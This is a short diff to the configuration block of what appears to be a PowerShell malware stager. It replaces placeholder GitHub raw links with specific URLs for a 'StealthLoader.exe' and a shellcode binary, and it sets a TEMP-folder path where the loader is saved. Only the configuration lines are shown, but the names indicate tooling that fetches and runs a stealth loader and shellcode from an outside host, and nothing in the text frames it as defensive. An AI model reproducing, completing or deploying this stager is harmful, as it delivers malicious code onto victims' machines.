@@ -1,7 +1,7 @@
 # --- Configuration ---
 # Update these URLs with your GitHub raw links
-$stealthLoaderUrl = "https://raw.githubusercontent.com/YourUserName/YourRepo/main/StealthLoader.exe"
-$shellcodeUrl     = "https://raw.githubusercontent.com/YourUserName/YourRepo/main/shellcode.bin"
+$stealthLoaderUrl = "https://raw.githubusercontent.com/Magturn/shelly/main/StealthLoader.exe"
+$shellcodeUrl     = "https://raw.githubusercontent.com/Magturn/Bat/main/win656file.bin"
 
 # Local path where the stealth loader executable will be saved
 $stealthLoaderPath = "$env:TEMP\StealthLoader.exe"
